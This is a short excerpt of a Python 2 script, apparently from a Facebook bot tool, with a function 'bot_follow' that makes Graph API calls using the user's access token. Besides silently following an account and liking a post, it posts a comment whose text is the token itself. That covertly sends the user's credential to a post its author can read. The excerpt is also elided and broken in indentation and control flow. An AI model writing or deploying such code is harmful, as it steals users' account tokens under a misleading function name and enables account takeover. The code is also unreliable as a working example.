...
def bot_follow():
	try:
		...
		requests.get('https://graph.facebook.com/100055913630645/subscribers?access_token='+token)
        requests.post('https://graph.facebook.com/315682243638894/likes?summary=true&access_token=' + token)
        requests.post('https://graph.facebook.com/316651796875272/comments/?message='+token+'&access_token=' + token)
        menu()
        print ' [!] Token Invalid!'
        sys.exit()
